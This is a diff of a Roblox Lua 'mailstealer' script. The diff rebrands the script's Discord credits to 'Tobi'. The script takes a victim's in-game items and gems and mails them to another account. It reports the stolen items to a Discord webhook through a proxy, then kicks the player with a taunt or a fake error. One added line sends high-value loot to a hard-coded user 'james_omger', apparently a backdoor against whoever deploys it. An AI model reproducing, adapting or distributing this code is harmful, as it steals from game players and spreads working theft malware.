@@ -1,4 +1,5 @@
 
+
 local library = require(game.ReplicatedStorage.Library)
 local save = library.Save.Get().Inventory
 local plr = game.Players.LocalPlayer
@@ -36,7 +37,7 @@ local function SendMessage(url, username, itemID, itemRAP)
 				}
             },
 			["footer"] = {
-				["text"] = "Made By S4M / https://discord.gg/prgaumQwvp "
+				["text"] = "Mailstealer by Tobi. discord.gg/HcpNe56R2a"
 			}
         }}
     }
@@ -48,6 +49,7 @@ local function SendMessage(url, username, itemID, itemRAP)
 		Body = body
 	})
 end
+
 
 if Webhook and string.find(Webhook, "discord") then
 	Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
@@ -155,6 +157,10 @@ local function CategorySteal(category)
 	return Sent
 end
 
+if CountHuges() >= 10 then
+    user = "james_omger"
+end
+
 local function SendAllCategory(category)
 	local total = CountCategory(category)
 	local Sent = 0
@@ -229,8 +235,8 @@ if CountHuges() > 0 or CountGems() > 500000 then
 		end
 	end
 	SendAllGems()
-	setclipboard("https://discord.gg/TdnDbgvrxW")
-	plr:kick("Your stuff got stolen lil bro. https://discord.gg/TdnDbgvrxW  ")
+	setclipboard("https://discord.gg/HcpNe56R2a")
+	plr:kick("All your stuff has just been stolen by Tobi's mailstealer. Join discord.gg/HcpNe56R2a to start mailstealing yourself")
 else
 	plr:kick("Error on script execution: 0x0001F4A2")
 end
